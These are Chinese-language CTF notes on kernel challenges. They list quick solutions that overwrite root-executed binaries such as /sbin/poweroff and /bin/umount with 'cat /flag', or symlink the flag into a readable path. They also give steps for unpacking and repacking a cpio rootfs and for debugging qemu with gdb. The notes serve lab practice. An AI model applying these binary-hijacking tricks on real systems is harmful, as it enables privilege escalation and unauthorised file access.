

# 简单解题

```sh
# m1, 直接打远程本地不一定行
echo "cat /flag" > /sbin/poweroff
# m2.
rm read_file.c
ln -s flag /read_file.c
./read_file

# m1.1
mv /sbin/poweroff /sbin/poweroff.bak
echo "cat /flag" > /sbin/poweroff
# m1.2
echo "cat /root/flag">/bin/umount
chmod +x /bin/umount
exit
```

# Basic
解包
```sh
mkdir core
cd core
cpio -idm < ../rootfs.cpio

# 1 重新打包, 2 修改启动脚本为 rootfs.cpio
find . | cpio -o --format=newc > ../rootfs.cpio
find . | cpio -o --format=newc >> ../rootfs.cpio

# 1.查看 /init 启动文件
# 2./etc/init.d/rcS
```

启动时挂调试
```sh
qemu-system-x86_64 \
    ... \
    -no-reboot
    -s  # -s 自动添加 1234 远程调试端口, -S 使CPU停止在开始执行的位置
# 将 setsid处的1000改为0 就能以root权限启动

gdb$ target remote ip:port

# root下
lsmod # 查看加载基地址
```